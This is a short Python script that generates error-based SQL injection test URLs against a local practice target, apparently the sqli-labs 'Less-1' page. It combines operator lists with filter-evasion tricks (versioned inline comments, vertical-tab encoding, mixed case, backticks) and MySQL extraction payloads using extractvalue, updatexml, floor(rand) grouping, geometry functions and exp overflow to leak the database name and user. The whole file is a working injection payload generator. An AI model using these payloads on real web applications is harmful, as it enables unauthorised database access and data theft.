a = ['and','or','xor','%26%26','/*!50000%26%26*/','&&','||','|','and!!!','/*!50000%26%26*/!!!','%0bor%0b','%0band%0b!!!','%0b|%0b!!!',
     'or!!!','xor!!!','%26%26!!!','&&!!!','||!!!','|!!!']
b = ['%20extraCtvalue(1,concat(0x7e,(select database()),0x7e))--+','%20`extractvaLue`(1,concat(0x7e,(select database()),0x7e))--+','`extractvalue`(1,concat(0x7e,(select database/**/(/**/)),0x7e))--+',
     '(select 1 from(selEct count(*),`concat`(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+','(select 1e0frOm(select count(*),concat(database/**/(/**/),floor(rand(0)*2))x from `information_schema`.tables group by x)a)--+',
     '`updateXml`(1,`concAt`(0x7e,(select database/*!*/(/**/)),0x7e),1)--+','`updateXml`(1,`concAt`(0x7e,(selEct database-- (1)%0a()),0x7e),~1)--+',
     'geometrYcollection((seLect * from(selEct * from(select database/**/(/**/))a)b))--+','geometrYcollection((seLect * from(selEct * from(selEct database-- (1)%0a())a)b))--+',
     'multipoinT((seLect * from(selEct * from(select database/**/(/**/))a)b))--+','multipoinT((seLect * from(selEct * from(selEct database-- (1)%0a())a)b))--+',
     'polygoN((seLect * from(selEct * from(select database/**/(/**/))a)b))--+','polygoN((seLect * from(selEct * from(selEct database-- (1)%0a())a)b))--+',
     'multipolygoN((seLect * from(selEct * from(select database/**/(/**/))a)b))--+','multipolygoN((seLect * from(selEct * from(selEct database-- (1)%0a())a)b))--+',
     'linestrinG((seLect * from(selEct * from(select database/**/(/**/))a)b))--+','linestrinG((seLect * from(selEct * from(selEct database-- (1)%0a())a)b))--+',
     'multilinestrinG((seLect * from(selEct * from(select database/**/(/**/))a)b))--+','multilinestrinG((seLect * from(selEct * from(selEct database-- (1)%0a())a)b))--+',
     ' `eXp`(~(seleCt * from(select database/**/(/**/))a))--+',' `eXp`(~(seleCt * from(select database-- (1)%0a())a))--+','(/*!updatexml*/(1,`concat`(0x7e,(select database-- (1)%0a()),0x7e),1))--+'
     ]
extra = ['union select 1,2,case when 1 like 1 then (exp(~(select * from(select database())a))) else 2 end--+',"/*&id='and (extractvalue(1,concat(0x7e,(select user()),0x7e)))--+*/",
         'procedure analyse(extractvalue(rand(),concat(0x3a,database())),1)--+','procedure anaLyse(`extractvaluE`(rand(),concat(0x3a,database/**/(/**/))),1)--+',
         ]
fuzzingurl ="http://127.0.0.1/sql/Less-1/?id=1'%20"      #url需要加上闭合符和空格
for z in extra:
    Exp = fuzzingurl+z
    print(Exp)
for x in a:
    for y in b:
        exp = ((fuzzingurl)+(x+y))
        print(exp)